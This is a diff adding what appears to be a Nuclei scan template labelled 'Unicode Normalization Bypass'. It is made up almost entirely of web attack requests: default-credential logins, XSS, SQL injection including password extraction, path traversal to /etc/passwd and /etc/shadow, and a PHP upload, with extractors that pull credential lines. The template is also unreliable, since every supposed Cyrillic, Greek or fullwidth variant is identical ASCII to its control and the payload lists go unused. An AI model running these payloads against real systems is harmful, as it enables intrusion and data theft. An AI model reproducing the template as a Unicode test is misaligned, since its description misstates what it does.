@@ -1,0 +1,256 @@
+id: medium-webapp-unicode-normalization-bypass
+
+info:
+  name: Unicode Normalization Bypass
+  author: elite-red-team
+  severity: medium
+  description: |
+    Advanced Unicode normalization bypass testing with multiple encoding techniques.
+    Tests for security bypasses using Unicode normalization forms (NFC, NFD, NFKC, NFKD),
+    homograph attacks, and Unicode character confusion to bypass filters and validation.
+  reference:
+    - https://owasp.org/www-community/attacks/Unicode_Encoding
+    - https://unicode.org/reports/tr15/
+    - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Unicode%20Injection
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N
+    cvss-score: 5.3
+    cwe-id: CWE-176
+  tags: unicode,normalization,bypass,encoding,homograph
+
+http:
+  - raw:
+      - |
+        POST {{BaseURL}}/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        
+        username=admin&password=admin
+      
+      - |
+        POST {{BaseURL}}/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        
+        username=admin&password=password
+      
+      - |
+        GET {{BaseURL}}/user?name=administrator HTTP/1.1
+        Host: {{Hostname}}
+      
+      - |
+        POST {{BaseURL}}/search HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        
+        query=<script>alert(1)</script>
+      
+      - |
+        GET {{BaseURL}}/file?path=..%2F..%2Fetc%2Fpasswd HTTP/1.1
+        Host: {{Hostname}}
+
+    attack: clusterbomb
+    payloads:
+      unicode_admin:
+        - "admin"          # Normal (control)
+        - "admin"          # Cyrillic lookalike
+        - "admin"          # Mixed scripts
+        - "admin"          # Fullwidth characters
+      unicode_script:
+        - "<script>"       # Normal (control)
+        - "<script>"       # Cyrillic lookalike
+        - "<script>"       # Mixed Cyrillic
+        - "<script>"       # Greek variants
+        - "<script>"       # Fullwidth brackets
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "welcome admin"
+          - "admin panel"
+          - "dashboard"
+          - "administration"
+          - "logged in"
+        condition: or
+        case-insensitive: true
+
+      - type: word
+        part: body
+        words:
+          - "alert(1)"
+          - "<script>"
+          - "javascript:"
+          - "onerror="
+        condition: or
+
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
+          - "bin:.*:1:1:"
+          - "daemon:.*:2:2:"
+
+      - type: status
+        status:
+          - 200
+          - 302
+
+  - raw:
+      - |
+        POST {{BaseURL}}/upload HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        
+        filename=test.php&content=<?php echo 'RCE'; ?>
+      
+      - |
+        GET {{BaseURL}}/include?file=..%2F..%2Fetc%2Fpasswd HTTP/1.1
+        Host: {{Hostname}}
+      
+      - |
+        POST {{BaseURL}}/api/users HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        
+        {"username": "admin", "role": "administrator"}
+
+    attack: sniper
+    payloads:
+      unicode_paths:
+        - "..%2F..%2Fetc%2Fpasswd"     # Normal
+        - "..%2F..%2Fetc%2Fpasswd"     # Cyrillic variants
+        - "..%2F..%2Fetc%2Fpasswd"     # Mixed Cyrillic
+        - "..%2F..%2Fetc%2Fpasswd"     # Fullwidth variants
+        - "..%2F..%2Fetc%2Fshadow"     # Shadow file
+        - "..%2F..%2Fproc%2Fversion"   # Proc version
+
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
+          - "Linux version"
+          - "<?php"
+          - "RCE"
+        condition: or
+
+      - type: word
+        part: body
+        words:
+          - "uploaded successfully"
+          - "file created"
+          - "administrator role"
+        condition: or
+        case-insensitive: true
+
+  - raw:
+      - |
+        POST {{BaseURL}}/filter HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        
+        input=<img src=x onerror=alert(1)>
+      
+      - |
+        GET {{BaseURL}}/search?q=<svg onload=alert(1)> HTTP/1.1
+        Host: {{Hostname}}
+      
+      - |
+        POST {{BaseURL}}/comment HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        
+        comment=<a href="javascript:alert(1)">click</a>
+
+    attack: sniper
+    payloads:
+      unicode_xss:
+        - "<img src=x onerror=alert(1)>"      # Normal
+        - "<svg onload=alert(1)>"             # SVG variant
+        - "<div onclick=alert(1)>"            # Div variant
+        - "<span onmouseover=alert(1)>"       # Span variant
+        - "<a href=\"javascript:alert(1)\">"  # Link variant
+        - "<img src=x onerror=alert(1)>"      # Fullwidth brackets
+        - "<img src=x onerror=alert(1)>"      # Mixed variants
+        - "<img src=x onerror=alert(1)>"      # Unicode variants
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "alert(1)"
+          - "javascript:"
+          - "onerror="
+          - "onload="
+          - "onclick="
+          - "onmouseover="
+        condition: or
+
+      - type: word
+        part: body
+        words:
+          - "<img"
+          - "<svg"
+          - "<div"
+          - "<span"
+          - "<a href"
+        condition: or
+
+  - raw:
+      - |
+        POST {{BaseURL}}/sql HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        
+        id=1' UNION SELECT * FROM users--
+      
+      - |
+        GET {{BaseURL}}/search?q=1' AND 1=1-- HTTP/1.1
+        Host: {{Hostname}}
+      
+      - |
+        POST {{BaseURL}}/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        
+        username=admin' OR '1'='1&password=test
+
+    attack: sniper
+    payloads:
+      unicode_sql:
+        - "1' UNION SELECT * FROM users--"    # Normal
+        - "1' AND 1=1--"                      # AND variant
+        - "1' OR 1=1--"                       # OR variant
+        - "admin' OR '1'='1"                  # Login bypass
+        - "1' UNION ALL SELECT * FROM users"  # UNION ALL
+        - "1'; SELECT * FROM users--"         # Stacked query
+        - "1' UNION SELECT password FROM users" # Password extraction
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "mysql"
+          - "postgresql"
+          - "sqlite"
+          - "syntax error"
+          - "database"
+        condition: or
+        case-insensitive: true
+
+      - type: regex
+        part: body
+        regex:
+          - "user.*:.*:.*:"
+          - "admin.*password"
+          - "SELECT.*FROM"
+
+    extractors:
+      - type: regex
+        part: body
+        group: 1
+        regex:
+          - "(root:.*:0:0:.*)"
+          - "(admin.*password.*)"
